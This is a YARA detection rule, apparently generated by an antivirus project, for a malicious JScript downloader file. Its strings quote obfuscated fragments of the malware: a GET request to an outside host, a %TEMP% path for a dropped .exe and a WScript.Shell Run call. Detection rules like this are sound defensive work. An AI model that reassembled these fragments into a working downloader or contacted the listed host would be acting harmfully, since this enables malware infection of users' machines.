rule sig_20160328_a394806bda605b3b52ab92dbe58ed773 {
  meta:
    description = "datamaliciousorder - file 20160328_a394806bda605b3b52ab92dbe58ed773.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3f6f6f222340105da18311e77c707904ea57d97c862199d006161f5692ff3e52"

  strings:
    $s1  = "function Oxlumjsume() {return Xdncgex[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SWyFceZM.exe\";};" fullword ascii
    $s2  = "Kngbkiki[Ttxrmtgnfe](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Ozqod](Hcwsi() * 11)} while (Kngbkiki[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Xdncgex = function Fedza() {return WScript[Wccoxolevl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Abigkulwe(Scbzbimg, Csfnfkr){return Scbzbimg - Csfnfkr;};" fullword ascii
    $s6  = "function Gtlulygmh(Qpuhofpmw){Xdncgex[\"Run\"](Qpuhofpmw, Oaldgbmtk, Oaldgbmtk);};" fullword ascii
    $s7  = "function Qtvuk() {return ((Lecpjn == true) && (Lecpjn == Bawtnxs)) ? 1 : Oaldgbmtk;};" fullword ascii
    $s8  = "function Cgmeqt(){return Frivcs;};" fullword ascii
    $s9  = "return Abigkulwe(Ykudcuutns, Fwhqclcnki);" fullword ascii
    $s10 = "function Zdyxa(){return Wccoxolevl;};" fullword ascii
    $s11 = "var Bawtnxs = false;" fullword ascii
    $s12 = "function Hcwsi(){return 22;};" fullword ascii
    $s13 = "Lecpjn = true; " fullword ascii
    $s14 = "Bawtnxs = true; " fullword ascii
    $s15 = "var Oodwrq = false;" fullword ascii
    $s16 = "function Fskikhvj()" fullword ascii
    $s17 = " while (Ivvlxdh){" fullword ascii
    $s18 = "var Dspciu = new this[\"Date\"]();" fullword ascii
    $s19 = "function Mtsnvywnkw(Evitn) {var Ltwez = (1, 2, 3, 4, 5, Evitn); return Ltwez;};" fullword ascii
    $s20 = "var Lecpjn = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}